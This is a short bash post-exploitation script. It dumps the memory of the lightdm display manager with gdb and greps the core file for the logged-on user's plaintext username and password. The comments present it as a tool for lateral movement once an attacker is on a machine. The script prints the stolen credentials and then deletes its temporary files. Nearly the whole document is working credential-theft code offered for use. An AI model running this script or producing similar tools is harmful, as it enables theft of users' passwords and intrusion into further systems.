#!/bin/bash
  
# lightdm (1.18.3-4 and probably earlier versions) stores the credentials of the logged on user in plaintext in memory.
# Useful for lateral movement; we're on a box, but we don't yet have any credentials...
# This script requires root or privileged access to gdb/gcore/ptrace, etc.
# Author: @0rbz_

cat << "EOF"
 _ _       _     _   ____  __  __ ____  
| (_) __ _| |__ | |_|  _ \|  \/  |  _ \ 
| | |/ _` | '_ \| __| | | | |\/| | |_) |
| | | (_| | | | | |_| |_| | |  | |  __/ 
|_|_|\__, |_| |_|\__|____/|_|  |_|_|    
     |___/  @0rbz_                       
EOF

# check ptrace_scope

ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)

if [ "$ptrace_scope" -eq "3" ]; then
    echo -e "\nUse of ptrace appears to be restricted due to /proc/sys/kernel/yama/ptrace_scope being set to $ptrace_scope. This won't work."
    exit
fi

gdb=$(which gdb)
if [[ ! -e $gdb ]]; then
	echo "GDB not found. please install it."
	exit
fi

strings=$(which strings)
commands="commands.txt"
lightdm_pid=$(ps aux |grep 'lightdm --session-child' |grep -v grep |awk '{print $2}' | head -n 1)
$gdb -p $lightdm_pid -x $commands --batch-silent 2>/dev/null

$strings /tmp/core_file > /tmp/core_strings
password=$(cat /tmp/core_strings | grep 'UN\*X-FAIL' -A1 |grep -v '\-UN\*X-FAIL')
account=$(cat /tmp/core_strings | grep 'XDG_GREETER_DATA_DIR' -A0 |cut -f6 -d"/" |sort -u)

echo -e 'USERNAME:' $account '\nPASSWORD:' $password

rm /tmp/core_strings && rm /tmp/core_file
